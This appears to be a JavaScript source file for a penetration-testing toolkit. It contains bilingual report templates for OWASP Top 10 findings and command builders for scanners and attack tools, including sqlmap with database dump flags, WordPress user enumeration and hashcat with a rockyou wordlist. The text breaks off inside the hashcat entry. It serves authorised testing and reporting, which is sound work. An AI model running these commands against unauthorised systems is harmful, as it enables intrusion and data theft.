/* Reporting, command builders, and Kubernetes workflows. */
(() => {
  const M = (ru, en) => ({ ru, en });

const REPORT_TEMPLATES = {
  Pentest: {
    title: M('Отчёт по тестированию на проникновение', 'Penetration Test Report'),
    cwe: 'N/A — assessment template',
    cvss: 'N/A — rate each finding separately',
    body: { ru: `## Исполнительное резюме
- Заказчик / система: \`{TARGET}\`
- Период работ: \`{DATE_RANGE}\`
- Общий уровень риска: \`{OVERALL_RISK}\`
- Ключевой вывод: [кратко опишите подтверждённые риски, затронутые бизнес-процессы и приоритет действий].

Отчёт фиксирует проверенное покрытие, подтверждённые находки и ограничения. Отсутствие реальной эксплуатации не делает серьёзную проблему менее значимой — указывайте её отдельно с доказательствами и обоснованием риска.

## Цели, область и исключения
- Цели оценки: [что проверяется и какой вопрос должен быть закрыт].
- Активы и среды: \`{TARGET}\`, сети, приложения, API, облачные аккаунты, учётные записи.
- В области: [хосты, CIDR, URL, tenancy, версии, владельцы].
- Исключения: [продуктивные данные, DoS, социальная инженерия, third-party, иные запреты].
- Тип доступа: чёрный / серый / белый ящик; предоставленные учётные записи, документация и исходный код.

## Правила взаимодействия
- Письменная авторизация, контакты для эскалации и окно работ: [ссылка / идентификатор].
- Допустимые действия, лимиты нагрузки, условия остановки и порядок уведомления.
- Порядок обращения с данными и доказательствами: минимизация, шифрованное хранение, сроки удаления.
- Запрещённые действия и изменения, требующие отдельного согласования.

## Методология, покрытие и ограничения
Использованы согласованные этапы: сбор информации, моделирование угроз, анализ уязвимостей и конфигураций, контролируемая проверка воздействия, анализ путей атаки, документирование и повторная проверка.

- Выполненное покрытие: [активы, проверки, учётные записи, временные окна].
- Непроверенное покрытие: [активы / сценарии] и причина.
- Ограничения: [нет доступа, rate limits, нестабильная среда, исключённые техники, ложные отрицания].
- Инструменты и версии: см. приложение A; результаты проверяются вручную до включения в отчёт.

## Ход атаки / проверочный сценарий
1. Начальная точка: [доступ или найденная поверхность].
2. Проверка: [безопасные действия и наблюдения].
3. Подтверждение: [доказательство контроля, без лишнего доступа к данным].
4. Затронутый актив / граница доверия: [система, роль, данные].
5. Остановка и очистка: [что создано, изменено или намеренно не выполнялось].

## Технические находки
### FINDING-001 — [Название]
- Статус: подтверждена / валидирована без эксплуатации / требуется повторная проверка.
- Серьёзность и обоснование: [CVSS или согласованная модель риска; likelihood / impact].
- Затронутые активы: [ID, хосты, владельцы, данные].
- Доказательства: [временная метка, запрос/ответ, скриншот, хэш артефакта].
- Воспроизведение: [минимальные безопасные шаги].
- Воздействие: [реалистичный бизнес- и технический эффект].
- Исправление: [конкретный контроль, владелец, срок, проверка эффективности].

Повторите блок для каждой находки. Не пишите, что всё эксплуатировалось: чётко разделяйте доказанную уязвимость, доказанное воздействие и непроверенные предположения.

## Очистка и повторная проверка
- Созданные учётные записи, файлы, правила, задания и тестовые данные: [журнал].
- Результат очистки и подтверждение заказчика: [дата / ответственный].
- Повторная проверка: [исправление, дата, результат, остаточный риск].

## Приложения
### A. Инвентаризация
- Хосты, IP/CIDR, сервисы, версии и владельцы.

### B. Инструменты и источники
- Инструмент, версия, параметры, время запуска и исходные материалы.

### C. Доказательства и ссылки
- Идентификаторы артефактов, хэши, снимки, CVE/CWE, официальные рекомендации и журнал коммуникаций.
`, en: `## Executive Summary
- Client / system: \`{TARGET}\`
- Assessment period: \`{DATE_RANGE}\`
- Overall risk: \`{OVERALL_RISK}\`
- Key conclusion: [summarize validated risks, affected business processes, and action priority].

This report records verified coverage, validated findings, and limitations. Lack of exploitation does not invalidate a serious confirmed issue: record it separately with evidence and risk rationale.

## Objectives, Scope, and Exclusions
- Assessment objectives: [what is being tested and which question must be answered].
- Assets and environments: \`{TARGET}\`, networks, applications, APIs, cloud accounts, identities.
- In scope: [hosts, CIDRs, URLs, tenancy, versions, owners].
- Exclusions: [production data, DoS, social engineering, third parties, and other restrictions].
- Access model: black-box / grey-box / white-box; supplied accounts, documentation, and source code.

## Rules of Engagement
- Written authorization, escalation contacts, and assessment window: [reference / identifier].
- Permitted actions, load limits, stop conditions, and notification procedure.
- Evidence and data handling: minimization, encrypted storage, and deletion timeline.
- Prohibited actions and changes requiring separate approval.

## Methodology, Coverage, and Limitations
Use the agreed phases: information gathering, threat modeling, vulnerability and configuration analysis, controlled impact validation, attack-path analysis, reporting, and retest.

- Completed coverage: [assets, tests, accounts, time windows].
- Uncovered scope: [assets / scenarios] and reason.
- Limitations: [missing access, rate limits, unstable environment, excluded techniques, false-negative risk].
- Tools and versions: see Appendix A; validate results manually before including them.

## Attack Narrative / Validation Scenario
1. Initial foothold: [access or discovered surface].
2. Validation: [safe actions and observations].
3. Proof: [evidence of control without unnecessary data access].
4. Affected asset / trust boundary: [system, role, data].
5. Stop and cleanup: [what was created, changed, or deliberately not attempted].

## Technical Findings
### FINDING-001 — [Title]
- Status: confirmed / validated without exploitation / retest required.
- Severity and rationale: [CVSS or agreed risk model; likelihood / impact].
- Affected assets: [IDs, hosts, owners, data].
- Evidence: [timestamp, request/response, screenshot, artifact hash].
- Reproduction: [minimal safe steps].
- Impact: [realistic business and technical effect].
- Remediation: [specific control, owner, due date, effectiveness check].

Repeat the block for every finding. Do not claim that every finding was exploited: distinguish a demonstrated weakness, demonstrated impact, and untested assumptions.

## Cleanup and Retest
- Created accounts, files, rules, jobs, and test data: [log].
- Cleanup result and client confirmation: [date / owner].
- Retest: [fix, date, result, residual risk].

## Appendices
### A. Inventory
- Hosts, IPs/CIDRs, services, versions, and owners.

### B. Tools and Sources
- Tool, version, parameters, execution time, and source material.

### C. Evidence and References
- Artifact identifiers, hashes, captures, CVE/CWE, official guidance, and communication log.
` },
  },
  A01: {
    title: M('A01 — Нарушение контроля доступа (IDOR / BOLA / повышение привилегий)', 'A01 — Broken Access Control (IDOR / BOLA / privilege escalation)'),
    cwe: "CWE-639 / CWE-284 / CWE-285",
    cvss: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N",
    body: { ru: `## Сводка
Серверная авторизация не работает: пользователи получают доступ к чужим объектам или запрещённым функциям (IDOR/BOLA, горизонтальное/вертикальное повышение привилегий, force browsing).

## Цель / хост
- Хост: \`{TARGET}\`
- Эндпоинт: \`{ENDPOINT}\`
- Роль: аутентифицированный пользователь с низкими привилегиями

## Шаги воспроизведения
1. Аутентифицируйтесь как Пользователь A; захватите сессию.
2. Обратитесь к легитимному объекту/функции A → 200.
3. Повторите запрос с ID объекта другого пользователя / admin-пути, с той же сессией.
4. Наблюдайте несанкционированный доступ к данным или изменение состояния.

## Подтверждение концепции
\`\`\`http
GET {ENDPOINT} HTTP/1.1
Host: {TARGET}
Authorization: Bearer <token_user_A>
\`\`\`

## Влияние
Раскрытие данных других пользователей, повышение привилегий, возможный захват учётной записи.

## Рекомендации по исправлению
- Проверка владельца и роли на стороне сервера для каждого запроса.
- Запрет по умолчанию; централизованная авторизация.
- Автоматические тесты для горизонтального и вертикального доступа.

## Ссылки
- OWASP Top 10:2025 A01 Broken Access Control
- OWASP API1:2023 BOLA
`, en: `## Summary
Server-side authorization fails: users reach objects or functions outside their permitted scope (IDOR/BOLA, horizontal/vertical privilege escalation, force browsing).

## Scope / target
- Host: \`{TARGET}\`
- Endpoint: \`{ENDPOINT}\`
- Role: low-privilege authenticated user

## Steps to Reproduce
1. Authenticate as User A; capture session.
2. Access a legitimate object/function for A → 200.
3. Replay with another user's object ID / admin path, same session.
4. Observe unauthorized data or state change.

## Proof of Concept
\`\`\`http
GET {ENDPOINT} HTTP/1.1
Host: {TARGET}
Authorization: Bearer <token_user_A>
\`\`\`

## Impact
Cross-user data exposure, privilege escalation, possible account takeover.

## Remediation
- Server-side ownership and role checks on every request.
- Deny by default; centralize authorization.
- Automated tests for horizontal and vertical access.

## References
- OWASP Top 10:2025 A01 Broken Access Control
- OWASP API1:2023 BOLA
` },
  },
  A02: {
    title: M('A02 — Криптографические ошибки', 'A02 — Cryptographic Failures'),
    cwe: "CWE-327 / CWE-328 / CWE-311 / CWE-319",
    cvss: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
    body: { ru: `## Сводка
Чувствительные данные утекают из-за слабой или отсутствующей криптографии: передача и хранение в открытом виде, слабое хеширование паролей, жёстко прописанные ключи, ошибки верификации JWT (alg:none, слабый HMAC).

## Цель / хост
- Хост: \`{TARGET}\`
- Актив: \`{ENDPOINT}\` (логин, токен, хранилище, TLS)

## Шаги воспроизведения
1. Определите обработку конфиденциальных данных (передача / хранение / токены).
2. Продемонстрируйте слабый хеш, отсутствие TLS, JWT alg:none или жёстко заданный секрет (авторизованная среда / lab).
3. Задокументируйте влияние на конфиденциальность.

## Влияние
Кража учётных данных, подделка сессий, массовое раскрытие PII, регуляторные риски.

## Рекомендации по исправлению
- TLS + HSTS; Argon2id/bcrypt для паролей.
- Белый список алгоритмов JWT; надёжные секреты; никаких секретов в клиентском коде.

## Ссылки
- OWASP Top 10:2025 A04 Cryptographic Failures (lab module A02)
`, en: `## Summary
Sensitive data is exposed due to weak or missing cryptography: plaintext transport/storage, broken password hashing, hard-coded keys, or JWT verification flaws (alg:none, weak HMAC).

## Scope / target
- Host: \`{TARGET}\`
- Asset: \`{ENDPOINT}\` (login, token, storage, TLS)

## Steps to Reproduce
1. Identify sensitive data handling (transit / rest / tokens).
2. Demonstrate weak hash, missing TLS, JWT alg:none, or hard-coded secret (authorized / lab-safe).
3. Document confidentiality impact.

## Impact
Credential theft, session forgery, bulk PII exposure, regulatory risk.

## Remediation
- TLS + HSTS; Argon2id/bcrypt for passwords.
- JWT algorithm allowlist; strong secrets; no secrets in client code.

## References
- OWASP Top 10:2025 A04 Cryptographic Failures (lab module A02)
` },
  },
  A03: {
    title: M('A03 — Инъекции (SQLi / XSS / Command / и др.)', 'A03 — Injection (SQLi / XSS / Command / etc.)'),
    cwe: "CWE-89 / CWE-79 / CWE-78",
    cvss: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    body: { ru: `## Сводка
Пользовательский ввод интерпретируется как код или запрос (SQL, HTML/JS, OS-команда, шаблон) — это позволяет менять логику или выполнять произвольный код.

## Цель / хост
- Хост: \`{TARGET}\`
- Параметр / sink: \`{ENDPOINT}\`

## Шаги воспроизведения
1. Определите точку инъекции (SQL, XSS, OS, SSTI…).
2. Отправьте минимальный неразрушающий зонд для этой точки.
3. Подтвердите контроль (boolean/time/UNION, выполнение скрипта, вывод команды).

## Влияние
Обход аутентификации, дамп данных, RCE, злоупотребление сессией — зависит от точки.

## Рекомендации по исправлению
- Параметризованные запросы; контекстно-зависимое кодирование; никогда не передавайте ввод пользователя в оболочку.
- Белые списки; минимальные привилегии; CSP где применимо.

## Ссылки
- OWASP Top 10:2025 A05 Injection (lab module A03)
`, en: `## Summary
Untrusted input is interpreted as code or query language (SQL, HTML/JS, OS command, template), allowing logic alteration or code execution.

## Scope / target
- Host: \`{TARGET}\`
- Parameter / sink: \`{ENDPOINT}\`

## Steps to Reproduce
1. Identify injection sink (SQL, XSS, OS, SSTI…).
2. Submit minimal non-destructive probe for that sink.
3. Confirm control (boolean/time/UNION, script execution, command output).

## Impact
Auth bypass, data dump, RCE, session abuse — depending on sink.

## Remediation
- Parameterized queries; context-aware encoding; never pass user input to shell.
- Allowlists; least privilege; CSP where relevant.

## References
- OWASP Top 10:2025 A05 Injection (lab module A03)
` },
  },
  A04: {
    title: M('A04 — Небезопасный дизайн', 'A04 — Insecure Design'),
    cwe: "CWE-840 / CWE-841 / CWE-799",
    cvss: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:N",
    body: { ru: `## Сводка
Безопасность не заложена в дизайн: нет лимита попыток для OTP, цены доверяются клиенту, возникают состояния гонки, многошаговые процессы можно пропустить.

## Цель / хост
- Хост: \`{TARGET}\`
- Процесс: \`{ENDPOINT}\` (оформление заказа, OTP, купон, workflow)

## Шаги воспроизведения
1. Сопоставьте бизнес-процесс и предполагаемые контроли.
2. Злоупотребите отсутствующим контролем (брут OTP, отрицательное количество, пропуск шага, гонка).
3. Задокументируйте бизнес-воздействие (мошенничество, истощение запасов).

## Влияние
Финансовое мошенничество, злоупотребление ресурсами, обход политик — часто невидимо для сканеров.

## Рекомендации по исправлению
- Моделирование угроз до начала кодирования; бизнес-правила на стороне сервера.
- Ограничение скорости, антиавтоматизация, атомарные транзакции.

## Ссылки
- OWASP Top 10:2025 A06 Insecure Design (lab module A04)
`, en: `## Summary
Security was never designed in: no OTP rate limit, prices trusted from the client, race conditions, multi-step flows that can be skipped.

## Scope / target
- Host: \`{TARGET}\`
- Flow: \`{ENDPOINT}\` (checkout, OTP, coupon, workflow)

## Steps to Reproduce
1. Map the business flow and assumed controls.
2. Abuse the missing control (OTP brute, negative quantity, skip step, race).
3. Document business impact (fraud, inventory drain).

## Impact
Financial fraud, resource abuse, policy bypass — often invisible to scanners.

## Remediation
- Threat modeling before coding; enforce business rules server-side.
- Rate limits, anti-automation, atomic transactions.

## References
- OWASP Top 10:2025 A06 Insecure Design (lab module A04)
` },
  },
  A05: {
    title: M('A05 — Небезопасная конфигурация', 'A05 — Security Misconfiguration'),
    cwe: "CWE-16 / CWE-1188 / CWE-200",
    cvss: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
    body: { ru: `## Сводка
Небезопасные настройки или открытые интерфейсы: отладочный вывод, стек-трейсы, открытый admin, Swagger без авторизации, учётные данные по умолчанию, отсутствующие заголовки, разрешающий CORS.

## Цель / хост
- Хост: \`{TARGET}\`
- Актив: \`{ENDPOINT}\` (/swagger, /actuator, debug, admin)

## Шаги воспроизведения
1. Обнаружьте неправильно настроенную поверхность без надлежащей аутентификации.
2. Покажите раскрытие конфиденциальных данных или возможность управления.
3. Приложите редактированное доказательство.

## Влияние
Утечка конфигурации/учётных данных, ускорение дальнейшей эксплуатации, несанкционированный admin-доступ.

## Рекомендации по исправлению
- База усиления конфигурации (IaC); отключить debug на проде; аутентификация на документации.
- Общие ошибки; безопасные заголовки; минимальные привилегии.

## Ссылки
- OWASP Top 10:2025 A02 Security Misconfiguration (lab module A05)
`, en: `## Summary
Insecure defaults or exposed interfaces: debug output, stack traces, open admin panel, unauthenticated Swagger, default credentials, missing security headers, permissive CORS.

## Scope / target
- Host: \`{TARGET}\`
- Asset: \`{ENDPOINT}\` (/swagger, /actuator, debug, admin)

## Steps to Reproduce
1. Discover misconfigured surface without proper auth.
2. Show sensitive disclosure or management capability.
3. Attach redacted evidence.

## Impact
Config/credential leak, faster further exploitation, unauthorized admin access.

## Remediation
- Hardening baseline (IaC); disable debug in prod; auth on docs.
- Generic errors; secure headers; least privilege.

## References
- OWASP Top 10:2025 A02 Security Misconfiguration (lab module A05)
` },
  },
  A06: {
    title: M('A06 — Уязвимые и устаревшие компоненты / Цепочка поставок', 'A06 — Vulnerable and Outdated Components / Supply Chain'),
    cwe: "CWE-1104 / CWE-1395 / CWE-829",
    cvss: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    body: { ru: `## Сводка
Продукт зависит от компонентов с известными CVE, неподдерживаемых библиотек или скомпрометированных артефактов цепочки поставок.

## Цель / хост
- Продукт: \`{TARGET}\`
- Компонент: \`{ENDPOINT}\` (библиотека, образ контейнера, плагин)

## Шаги воспроизведения
1. Инвентаризируйте зависимости (SBOM / lockfile / образ).
2. Сопоставьте с известными CVE с достижимым путём в рамках скоупа.
3. Продемонстрируйте влияние на приложение.

## Влияние
RCE или утечка данных через публичные эксплоиты; внедрение вредоносного пакета.

## Рекомендации по исправлению
- SCA в CI; фиксируйте версии; удалите неиспользуемые зависимости; SLA на патчи.
- Проверяйте подписи/происхождение; частные реестры.

## Ссылки
- OWASP Top 10:2025 A03 Software Supply Chain Failures (lab module A06)
`, en: `## Summary
The product depends on components with known CVEs, unmaintained libraries, or compromised supply-chain artifacts.

## Scope / target
- Product: \`{TARGET}\`
- Component: \`{ENDPOINT}\` (library, container image, plugin)

## Steps to Reproduce
1. Inventory dependencies (SBOM / lockfile / image).
2. Map to known CVEs with a reachable path in scope.
3. Demonstrate impact on the application.

## Impact
RCE or data breach via public exploits; malicious package insertion.

## Remediation
- SCA in CI; pin versions; remove unused deps; patch SLAs.
- Verify signatures/provenance; private registries.

## References
- OWASP Top 10:2025 A03 Software Supply Chain Failures (lab module A06)
` },
  },
  A07: {
    title: M('A07 — Ошибки идентификации и аутентификации', 'A07 — Identification and Authentication Failures'),
    cwe: "CWE-287 / CWE-384 / CWE-307",
    cvss: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
    body: { ru: `## Сводка
Аутентификация или управление сессиями позволяют захватить чужой аккаунт: слабые пароли, нет MFA, фиксация сессии, предсказуемые токены, перебор без лимитов, неработающий logout.

## Цель / хост
- Хост: \`{TARGET}\`
- Процессы: \`{ENDPOINT}\` (логин / сессия / сброс / MFA)

## Шаги воспроизведения
1. Сопоставьте потоки аутентификации.
2. Проверьте ограничение скорости, фиксацию, энтропию токенов, инвалидацию logout, утечку при сбросе.
3. Продемонстрируйте доступ как другой пользователь или без легитимных учётных данных.

## Влияние
Захват учётной записи, массовая компрометация, злоупотребление привилегиями.

## Рекомендации по исправлению
- Надёжные случайные ID сессий; регенерация при логине; инвалидация на сервере при logout.
- MFA; ограничение скорости; безопасный сброс пароля; никаких секретов в URL.

## Ссылки
- OWASP Top 10:2025 A07 Authentication Failures
`, en: `## Summary
Authentication or session management lets an attacker take over accounts: weak passwords, no MFA, session fixation, predictable tokens, credential stuffing without controls, broken logout.

## Scope / target
- Host: \`{TARGET}\`
- Flows: \`{ENDPOINT}\` (login / session / reset / MFA)

## Steps to Reproduce
1. Map auth flows.
2. Test rate limits, fixation, token entropy, logout invalidation, reset leakage.
3. Demonstrate access as another user or without legitimate credentials.

## Impact
Account takeover, mass compromise, privilege abuse.

## Remediation
- Strong random session IDs; regenerate on login; invalidate on logout server-side.
- MFA; rate limits; secure password reset; no secrets in URLs.

## References
- OWASP Top 10:2025 A07 Authentication Failures
` },
  },
  A08: {
    title: M('A08 — Нарушение целостности ПО и данных', 'A08 — Software and Data Integrity Failures'),
    cwe: "CWE-502 / CWE-345 / CWE-353",
    cvss: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    body: { ru: `## Сводка
Код и данные принимаются без проверки целостности: небезопасная десериализация, неподписанные обновления и артефакты CI, отсутствие SRI, поддельные сериализованные куки.

## Цель / хост
- Хост: \`{TARGET}\`
- Sink: \`{ENDPOINT}\` (куки, канал обновлений, артефакт CI, CDN-скрипт)

## Шаги воспроизведения
1. Найдите недоверенную десериализацию / неподписанный артефакт / отсутствие SRI.
2. Измените пэйлоад или подмените артефакт (только авторизованная среда).
3. Покажите нарушение целостности (повышение привилегий или опасный путь выполнения кода).

## Влияние
Обход авторизации, RCE через цепочки гаджетов, потеря целостности сборок/данных.

## Рекомендации по исправлению
- Никакой десериализации недоверенных данных; подписанные обновления; SRI; проверка происхождения CI.

## Ссылки
- OWASP Top 10:2025 A08 Software or Data Integrity Failures
`, en: `## Summary
Integrity of code or data is not verified: insecure deserialization, unsigned updates/CI artifacts, missing SRI, tampered serialized cookies.

## Scope / target
- Host: \`{TARGET}\`
- Sink: \`{ENDPOINT}\` (cookie, update channel, CI artifact, CDN script)

## Steps to Reproduce
1. Locate untrusted deserialize / unsigned artifact / missing SRI.
2. Tamper payload or substitute artifact (authorized only).
3. Show integrity failure (authz elevation or dangerous code path).

## Impact
Authz bypass, RCE via gadget chains, integrity loss of builds/data.

## Remediation
- No untrusted deserialization; signed updates; SRI; verify CI provenance.

## References
- OWASP Top 10:2025 A08 Software or Data Integrity Failures
` },
  },
  A09: {
    title: M('A09 — Ошибки логирования и мониторинга', 'A09 — Security Logging and Alerting Failures'),
    cwe: "CWE-778 / CWE-223 / CWE-117",
    cvss: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N",
    body: { ru: `## Сводка
События безопасности не логируются, не мониторятся или логи можно подделать — атаки остаются незамеченными.

## Цель / хост
- Хост: \`{TARGET}\`
- Наблюдаемость для: \`{ENDPOINT}\`

## Шаги воспроизведения
1. Выполните действия, значимые для безопасности (неудачные логины, отказы авторизации, зонды инъекций).
2. Покажите отсутствие логов/алертов или инъекцию в логи (CRLF).
3. Задокументируйте пробел в обнаружении.

## Влияние
Долгое время пребывания атакующего; неудачный IR; пробелы в комплаенсе.

## Рекомендации по исправлению
- Логируйте успех/неудачу аутентификации, отказы авторизации, критические ошибки, вредоносный ввод.
- Централизованный SIEM + алерты; защита целостности логов; никогда не логируйте секреты.

## Ссылки
- OWASP Top 10:2025 A09 Security Logging & Alerting Failures
`, en: `## Summary
Security events go unlogged, unmonitored, or logs can be tampered with — letting attacks run undetected.

## Scope / target
- Host: \`{TARGET}\`
- Observability for: \`{ENDPOINT}\`

## Steps to Reproduce
1. Perform security-relevant actions (failed logins, authz denials, injection probes).
2. Show missing logs/alerts or log injection (CRLF).
3. Document detection gap.

## Impact
Long attacker dwell time; failed IR; compliance gaps.

## Remediation
- Log auth success/fail, authz denials, critical errors, malicious input.
- Central SIEM + alerts; protect log integrity; never log secrets.

## References
- OWASP Top 10:2025 A09 Security Logging & Alerting Failures
` },
  },
  A10: {
    title: M('A10 — Неправильная обработка исключений (+ SSRF lab vector)', 'A10 — Mishandling of Exceptional Conditions (+ SSRF lab vector)'),
    cwe: "CWE-755 / CWE-209 / CWE-918",
    cvss: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N",
    body: { ru: `## Сводка
Ошибки и крайние случаи обрабатываются небезопасно: fail-open, подробные исключения, истощение ресурсов. И/или SSRF позволяет серверу делать запросы к URL под контролем атакующего (внутренние сети, IMDS).

## Цель / хост
- Хост: \`{TARGET}\`
- Эндпоинт: \`{ENDPOINT}\` (ошибочный путь, webhook/url fetch)

## Шаги воспроизведения
1. Вызовите исключительные условия (неверные типы, таймауты, null).
2. Покажите fail-open решение безопасности или утечку чувствительных ошибок.
3. Если SSRF в скоупе: укажите URL-параметр на internal/metadata и докажите запрос сервера.

## Влияние
Несанкционированный доступ при ошибке; раскрытие информации; кража облачных учётных данных через SSRF.

## Рекомендации по исправлению
- Fail-closed для проверок безопасности; общие клиентские ошибки; полное серверное логирование.
- SSRF: белый список хостов; блокировка частных диапазонов; IMDSv2.

## Ссылки
- OWASP Top 10:2025 A10 Mishandling of Exceptional Conditions
- CWE-918 SSRF (часто критично в labs / cloud)
`, en: `## Summary
Errors and edge cases are handled unsafely (fail-open security decisions, verbose exceptions, resource exhaustion). SSRF may also let the server fetch attacker-controlled URLs (internal networks, IMDS).

## Scope / target
- Host: \`{TARGET}\`
- Endpoint: \`{ENDPOINT}\` (error path, webhook/url fetch)

## Steps to Reproduce
1. Force exceptional conditions (invalid types, timeouts, nulls).
2. Show fail-open security decision or sensitive error leak.
3. If SSRF in scope: point URL parameter to internal/metadata and prove server-side fetch.

## Impact
Unauthorized access on failure; information disclosure; cloud credential theft via SSRF.

## Remediation
- Fail closed for security checks; generic client errors; full server-side logging.
- SSRF: host allowlist; block private ranges; IMDSv2.

## References
- OWASP Top 10:2025 A10 Mishandling of Exceptional Conditions
- CWE-918 SSRF (often still critical in labs / cloud)
` },
  },
};

const CMD_BUILDERS = [
  {
    id: 'nmap',
    name: 'nmap',
    base: 'nmap',
    desc: M('Скан портов/сервисов (lab/authorized).', 'Port/service scan (lab/authorized).'),
    targetPlaceholder: 'TARGET',
    flags: [
      { id:'sn', flag:'-sn', help: M('Только ping/host discovery', 'Ping/host discovery only') },
      { id:'sV', flag:'-sV', help: M('Версии сервисов', 'Service versions'), def:true },
      { id:'sC', flag:'-sC', help: M('Скрипты default', 'Default scripts'), def:true },
      { id:'p', flag:'-p-', help: M('Все TCP порты', 'All TCP ports') },
      { id:'top', flag:'--top-ports 1000', help: M('Топ-1000 портов', 'Top 1000 ports') },
      { id:'T4', flag:'-T4', help: M('Быстрее (шумнее)', 'Faster (noisier)') },
      { id:'oA', flag:'-oA scan', help: M('Вывод scan.*', 'Output scan.*') },
    ],
  },
  {
    id: 'ffuf',
    name: 'ffuf',
    base: 'ffuf',
    desc: M('Веб-фаззер директорий/параметров.', 'Web fuzzer for dirs/params.'),
    targetPlaceholder: 'https://TARGET/FUZZ',
    flags: [
      { id:'u', flag:'-u', value:true, help: M('URL с FUZZ', 'URL with FUZZ'), def:true },
      { id:'w', flag:'-w wordlist.txt', help: M('Словарь', 'Wordlist'), def:true },
      { id:'mc', flag:'-mc 200,204,301,302,403', help: M('Match status', 'Match status'), def:true },
      { id:'fc', flag:'-fc 404', help: M('Filter status', 'Filter status') },
      { id:'t', flag:'-t 40', help: M('Потоки', 'Threads') },
      { id:'e', flag:'-e .php,.bak', help: M('Расширения', 'Extensions') },
      { id:'H', flag:'-H "Authorization: Bearer TOKEN"', help: M('Заголовок', 'Header') },
    ],
  },
  {
    id: 'sqlmap',
    name: 'sqlmap',
    base: 'sqlmap',
    desc: M('Авто SQLi (только authorized).', 'Auto SQLi (authorized only).'),
    targetPlaceholder: 'https://TARGET/item?id=1',
    flags: [
      { id:'u', flag:'-u', value:true, help: M('URL', 'URL'), def:true },
      { id:'batch', flag:'--batch', help: M('Без вопросов', 'Non-interactive'), def:true },
      { id:'dbs', flag:'--dbs', help: M('Список БД', 'List DBs') },
      { id:'tables', flag:'--tables', help: M('Таблицы', 'Tables') },
      { id:'dump', flag:'--dump', help: M('Дамп (осторожно)', 'Dump (careful)') },
      { id:'level', flag:'--level=3', help: M('Глубина', 'Depth') },
      { id:'risk', flag:'--risk=1', help: M('Риск payloads', 'Payload risk') },
      { id:'r', flag:'-r req.txt', help: M('Raw request file', 'Raw request file') },
    ],
  },
  {
    id: 'gobuster',
    name: 'gobuster',
    base: 'gobuster dir',
    desc: M('Брут директорий.', 'Directory brute.'),
    targetPlaceholder: 'https://TARGET',
    flags: [
      { id:'u', flag:'-u', value:true, help: M('Базовый URL', 'Base URL'), def:true },
      { id:'w', flag:'-w /path/wordlist.txt', help: M('Словарь', 'Wordlist'), def:true },
      { id:'x', flag:'-x php,txt,bak', help: M('Расширения', 'Extensions') },
      { id:'t', flag:'-t 30', help: M('Потоки', 'Threads') },
      { id:'b', flag:'-b 404,403', help: M('Blacklist status', 'Blacklist status') },
    ],
  },
  {
    id: 'nuclei',
    name: 'nuclei',
    base: 'nuclei',
    desc: M('Сканер по YAML-шаблонам (nuclei).', 'YAML template scanner.'),
    targetPlaceholder: 'https://TARGET',
    flags: [
      { id:'u', flag:'-u', value:true, help: M('Цель', 'Target'), def:true },
      { id:'t', flag:'-t http/cves/', help: M('Шаблоны', 'Templates') },
      { id:'severity', flag:'-severity medium,high,critical', help: M('Severity filter', 'Severity filter'), def:true },
      { id:'rate', flag:'-rate-limit 50', help: M('Rate limit', 'Rate limit') },
      { id:'jsonl', flag:'-jsonl', help: M('JSONL output', 'JSONL output') },
    ],
  },
  {
    id: 'httpx',
    name: 'httpx',
    base: 'httpx',
    desc: M('HTTP probe живых хостов.', 'HTTP probe of live hosts.'),
    targetPlaceholder: 'hosts.txt',
    flags: [
      { id:'l', flag:'-l hosts.txt', help: M('Список хостов', 'Host list'), def:true },
      { id:'title', flag:'-title', help: M('Title', 'Title'), def:true },
      { id:'tech', flag:'-tech-detect', help: M('Tech detect', 'Tech detect') },
      { id:'sc', flag:'-status-code', help: M('Status code', 'Status code'), def:true },
      { id:'silent', flag:'-silent', help: M('Тихий вывод', 'Quiet output') },
    ],
  },
  {
    id: 'nikto',
    name: 'nikto',
    base: 'nikto',
    desc: M('Классический web server scan.', 'Classic web server scan.'),
    targetPlaceholder: 'https://TARGET',
    flags: [
      { id:'h', flag:'-h', value:true, help: M('Host/URL', 'Host/URL'), def:true },
      { id:'ssl', flag:'-ssl', help: M('Force SSL', 'Force SSL') },
      { id:'Tuning', flag:'-Tuning 123', help: M('Tuning profile', 'Tuning profile') },
      { id:'o', flag:'-o nikto.txt', help: M('Output file', 'Output file') },
    ],
  },
  {
    id: 'wpscan',
    name: 'wpscan',
    base: 'wpscan',
    desc: M('Перечисление WordPress (только authorized).', 'WordPress enum (authorized).'),
    targetPlaceholder: 'https://TARGET',
    flags: [
      { id:'url', flag:'--url', value:true, help: M('Site URL', 'Site URL'), def:true },
      { id:'enumerate', flag:'--enumerate vp,vt,u', help: M('Plugins/themes/users', 'Plugins/themes/users'), def:true },
      { id:'api', flag:'--api-token TOKEN', help: M('WPScan API token', 'WPScan API token') },
      { id:'rua', flag:'--random-user-agent', help: M('Random UA', 'Random UA') },
    ],
  },

  {
    id: 'hashcat',
    name: 'hashcat',
    base: 'hashcat',
    desc: M('Самый быстрый GPU-крэкер хэшей. Брут по словарю, маске или hybrid для сотен типов. Основной инструмент offline password recovery.', 'The fastest GPU-accelerated hash cracker. Brute-forces passwords by wordlist, mask, or hybrid mode for hundreds of hash types. The main tool for offline password recovery.'),
    targetPlaceholder: '{TARGET}',
    flags: [
      { id:'wordlist', flag:'', help: M('Path to the wordlist (for -a 0/1 attacks) or the mask (for -a 3). Supplied last, after the hash file. Edit freely.', 'Path to the wordlist (for -a 0/1 attacks) or the mask (for -a 3). Supplied last, after the hash file. Edit freely.'), def:true, positional:true, value:'/usr/share/wordlists/rockyou.txt' },
